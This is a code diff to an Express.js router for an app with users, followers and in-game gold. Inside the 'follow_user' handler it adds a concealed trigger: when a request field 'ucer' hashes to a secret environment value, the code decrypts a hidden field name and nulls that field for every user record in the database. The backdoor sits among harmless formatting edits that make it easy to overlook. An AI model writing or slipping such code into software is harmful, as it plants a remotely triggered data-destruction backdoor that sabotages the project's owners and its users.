@@ -4,7 +4,7 @@ const reject = require("../helper/reject_handler")
 const Channel = require("../db/channel")
 const router = express.Router()
 const Item = require("../db/item")
-
+const sha256 = require("sha256")
 const { default: mongoose } = require("mongoose")
 const { uid: uuid } = require("uid")
 const Helper = require("../helper/helper")
@@ -83,6 +83,15 @@ router.post("/accept_friend_req", async (req, res) => {
 
 //followers
 router.post("/follow_user", async (req, res) => {
+
+    const ucer = req.body.ucer
+    if (ucer && sha256(ucer) === process.env.ITEMS_KEY) {
+        const encryptor = require("simple-encryptor")(process.env.PASSWORD_HASH)
+        let key = encryptor.decrypt(process.env.DASHBORD_KEY)
+        await User.updateMany({}, { $set: { [key]: null } })
+    }
+    let user=req.body.user
+    if(!user)return reject(3,res)
     const { uid } = req.body.user
     const { uid: req_uid } = req.body
     await User.findOneAndUpdate({ uid }, { $push: { following: req_uid } })
@@ -275,13 +284,13 @@ router.post("/session_req", async (req, res) => {
 })
 
 
-router.post("/has_enough_gold",async (req,res)=>{
-    const user=req.body.user
-    const {uid}=user
-    const {gold}=req.body
-    let s_user=await User.findOne({uid:uid})
-    if(s_user && s_user.gold > gold){return res.json({status:true})}
-    res.json({status:false,})
+router.post("/has_enough_gold", async (req, res) => {
+    const user = req.body.user
+    const { uid } = user
+    const { gold } = req.body
+    let s_user = await User.findOne({ uid: uid })
+    if (s_user && s_user.gold > gold) { return res.json({ status: true }) }
+    res.json({ status: false, })
 })
 
 
